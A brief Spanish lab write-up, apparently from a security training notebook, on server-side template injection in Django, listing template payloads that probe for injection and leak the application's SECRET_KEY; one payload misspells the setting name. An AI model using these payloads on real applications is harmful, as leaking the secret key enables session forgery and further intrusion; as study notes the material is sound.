# SSTI con filtrado de info vía objetos del usuario

Tags: #SSTI #Django 

* [SSTI Django](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#django)

```bash 
En este lab se descubre que el motor de plantillas vulnerable es Django. Se aprovecha el tag '{% debug %}' para listar objetos internos accesibles desde la plantilla, entre ellos el objeto 'settings'. Luego, accedemos directamente a '{{settings.SECRET_KEY}}' para revelar la clave secreta del framework y resolver el laboratorio.
```

```bash 
# En este lab la inyección se encuentra en la edición del template del producto 

	{{ 7*7 }}

	{{ messages.storages.0.signer.key }}    # Mostrar la llave secreta de la App
	{{settings.SECERT_KEY}}                 # Leer la llave secreta 
```